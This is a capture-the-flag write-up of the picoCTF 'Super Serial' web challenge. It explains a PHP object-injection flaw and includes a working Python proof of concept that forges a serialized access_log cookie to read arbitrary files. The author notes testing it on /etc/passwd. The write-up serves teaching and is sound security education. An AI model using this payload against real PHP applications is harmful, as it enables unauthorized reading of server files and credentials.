# Super Serial

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{1_c4nn0t_s33_y0u_2fba20fa}`

## Summary

A PHP login app stores authentication state as a base64-encoded serialized PHP object in the
`login` cookie, and deserializes it with `unserialize()` with no type restriction (PHP Object
Injection). A second, unrelated class defined elsewhere in the same application happens to have
a `log_file` property and a `__toString()` method that reads and returns that file's contents.
Substituting a forged object of that class for the expected one, and triggering the app's own
error-handling code path (which string-concatenates the deserialized object), turns the login
mechanism into an arbitrary file read.

## Discovery

Apache serves `.phps` files as syntax-highlighted source instead of executing them, exposing the
full application logic. `index.phps` shows the login flow stores the session as a serialized
object:

```php
$perm_res = new permissions($username, $password);
setcookie("login", urlencode(base64_encode(serialize($perm_res))), ...);
```

`cookie.phps` shows the corresponding deserialization, with no check on what class actually
comes back:

```php
if(isset($_COOKIE["login"])){
    try{
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    }
    catch(Error $e){
        die("Deserialization error. ".$perm);
    }
}
```

If `$perm` isn't actually a `permissions` object, calling `is_guest()`/`is_admin()` on it throws
a PHP `Error` (undefined method), caught here, and the code then concatenates `$perm` directly
into a string, implicitly invoking its `__toString()`.

`authentication.phps` defines exactly the gadget needed:

```php
class access_log
{
    public $log_file;
    function __toString() {
        return $this->read_log();
    }
    function read_log() {
        return file_get_contents($this->log_file);
    }
}
```

Submitting a serialized `access_log` object instead of a `permissions` object makes the
`is_guest()` call fail as expected, lands in the catch block, and `__toString()` reads whatever
file `log_file` points to, straight into the error page.

## Proof of Concept

```python
import base64, requests

def php_obj(cls, props):
    body = "".join(f's:{len(k)}:"{k}";s:{len(v)}:"{v}";' for k, v in props.items())
    return f'O:{len(cls)}:"{cls}":{len(props)}:{{{body}}}'

payload = php_obj("access_log", {"log_file": "/var/www/flag"})
cookie_val = base64.b64encode(payload.encode()).decode()
r = requests.get("http://TARGET/authentication.php", cookies={"login": cookie_val})
print(r.text)
```

```
Deserialization error. picoCTF{1_c4nn0t_s33_y0u_2fba20fa}
```

(Verified the primitive first against `/etc/passwd`, which returned its real contents, before
locating the flag at `/var/www/flag`, a sibling of the web root rather than inside it.)

## Root Cause

`unserialize()` on attacker-controlled input reconstructs whatever class the serialized data
names, with no validation that it matches the expected type. PHP's object model then calls
whatever magic methods (`__toString()`, `__wakeup()`, `__destruct()`, etc.) that class defines
automatically at the appropriate point, letting an attacker chain together unrelated classes
already present in the application into a "gadget" with impact far beyond what either class was
individually designed for.

## CWE / OWASP

- **CWE-502**: Deserialization of Untrusted Data
- **CWE-540**: Inclusion of Sensitive Information in Source Code (`.phps` source disclosure)
- **OWASP A08:2021**: Software and Data Integrity Failures
